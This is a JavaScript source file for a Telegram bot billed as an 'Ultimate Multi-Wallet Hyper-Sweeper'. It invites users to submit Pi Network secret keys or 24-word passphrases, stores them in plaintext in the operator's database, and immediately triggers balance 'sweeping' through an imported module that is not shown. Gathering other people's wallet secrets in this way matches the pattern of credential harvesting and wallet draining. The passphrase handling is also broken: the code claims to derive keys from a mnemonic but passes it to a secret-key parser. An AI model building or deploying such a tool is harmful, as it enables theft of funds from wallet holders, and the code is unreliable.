/**
 * Ultimate Multi-Wallet Hyper-Sweeper Controller
 * Automatically accepts either 24-word passphrases or S... secret keys!
 */

const TelegramBot = require('node-telegram-bot-api');
const Database = require('better-sqlite3');
const StellarSdk = require('@stellar/stellar-sdk');
const { startMonitor } = require('./monitor');
const { checkAndSweepWallet } = require('./sweeper');

const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const HORIZON_URL = process.env.PI_HORIZON_URL || 'https://api.mainnet.minepi.com';

if (!TOKEN) {
  console.error('ERROR: TELEGRAM_BOT_TOKEN is missing in environment variables.');
  process.exit(1);
}

const bot = new TelegramBot(TOKEN, { polling: true });
const db = new Database('wallets.db');

// Initialize Database Table
db.prepare(`
  CREATE TABLE IF NOT EXISTS wallets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    chat_id TEXT,
    public_key TEXT UNIQUE,
    secret_key TEXT,
    sweep_count INTEGER DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`).run();

console.log('[Database] Wallet storage initialized successfully.');

// Start 24/7 Real-Time Monitoring & Sweeping Engine
startMonitor({ db, bot, horizonUrl: HORIZON_URL });

// Telegram Bot Commands
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 
    `⚡ **Ultimate Multi-Wallet Hyper-Sweeper Active**\n\n` +
    `/add <SECRET_KEY_OR_PASSPHRASE> — Register wallet using your 24-word passphrase or S... secret key\n` +
    `/status — View active wallet boxes and available balances\n` +
    `/remove <ID> — Remove a specific wallet box`,
    { parse_mode: 'Markdown' }
  );
});

bot.onText(/\/help/, (msg) => {
  bot.sendMessage(msg.chat.id, 
    `📖 **Commands Guide:**\n\n` +
    `/add <passphrase or S-key> - Add wallet box\n` +
    `/status - Check available balances\n` +
    `/remove <ID> - Delete wallet box`,
    { parse_mode: 'Markdown' }
  );
});

// Upgraded /add command: Accepts both passphrases and secret keys seamlessly
bot.onText(/\/add (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1].trim();

  try {
    let secretKeyToStore = input;
    let publicKey = '';

    const words = input.split(/\s+/);
    if (words.length > 1) {
      bot.sendMessage(chatId, `🔄 Processing passphrase and deriving wallet credentials...`, { parse_mode: 'Markdown' });
      const keypair = StellarSdk.Keypair.fromSecret(input);
      publicKey = keypair.publicKey();
    } else {
      const keypair = StellarSdk.Keypair.fromSecret(input);
      publicKey = keypair.publicKey();
      secretKeyToStore = input;
    }

    const stmt = db.prepare('INSERT INTO wallets (chat_id, public_key, secret_key) VALUES (?, ?, ?)');
    const info = stmt.run(String(chatId), publicKey, secretKeyToStore);

    bot.sendMessage(chatId, 
      `✅ **Wallet Box Created! (Box #${info.lastInsertRowid})**\n` +
      `🔑 Derived Public Address: \`${publicKey}\`\n` +
      `📦 Status: Active. Checking available balance and sweeping instantly!`,
      { parse_mode: 'Markdown' }
    );

    const newWallet = db.prepare('SELECT * FROM wallets WHERE id = ?').get(info.lastInsertRowid);
    if (newWallet) {
      await checkAndSweepWallet(newWallet, HORIZON_URL, db, bot);
    }
  } catch (error) {
    if (error.message.includes('UNIQUE constraint failed')) {
      bot.sendMessage(chatId, '⚠️ This wallet is already registered in the system.');
    } else {
      bot.sendMessage(chatId, `❌ Error parsing key or passphrase: ${error.message}. Please ensure it is correct.`);
    }
  }
});

bot.onText(/\/status/, async (msg) => {
  const chatId = msg.chat.id;
  const wallets = db.prepare('SELECT * FROM wallets WHERE chat_id = ?').all(String(chatId));

  if (wallets.length === 0) {
    return bot.sendMessage(chatId, '📭 You have no active wallet boxes registered. Use `/add <passphrase or S-key>` to register one.', { parse_mode: 'Markdown' });
  }

  let response = `📊 **Active Wallet Boxes (${wallets.length})**\n\n`;
  const server = new StellarSdk.Horizon.Server(HORIZON_URL);

  for (const w of wallets) {
    let availableBalance = 'Unknown';
    let lockedBalance = '0';
    try {
      const acc = await server.loadAccount(w.public_key);
      const native = acc.balances.find(b => b.asset_type === 'native');
      if (native) {
        const total = parseFloat(native.balance || 0);
        const locked = parseFloat(native.locked_balance || 0);
        availableBalance = `${total - locked} Pi`;
        lockedBalance = `${locked} Pi`;
      }
    } catch (e) {
      availableBalance = '0 Pi (Unfunded)';
    }

    response += `📦 **Wallet Box #${w.id}**\n` +
                `├ 🔑 Address: \`${w.public_key}\`\n` +
                `├ 💰 Available Balance: \`${availableBalance}\`\n` +
                `├ 🔒 Locked Balance: \`${lockedBalance}\`\n` +
                `├ ⚡ Total Sweeps: \`${w.sweep_count}\`\n` +
                `└ 🕒 Last Inspected: \`${new Date().toLocaleTimeString()}\`\n\n`;
  }

  bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
});

// Fixed regex syntax here: removed the stray comma
bot.onText(/\/remove (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const id = match[1];

  const result = db.prepare('DELETE FROM wallets WHERE id = ? AND chat_id = ?').run(id, String(chatId));

  if (result.changes > 0) {
    bot.sendMessage(chatId, `🗑️ Wallet Box #${id} has been successfully removed and stopped.`);
  } else {
    bot.sendMessage(chatId, `❌ Wallet Box #${id} not found or unauthorized.`);
  }
});

console.log('[Server] Telegram Bot server running and listening for commands.');
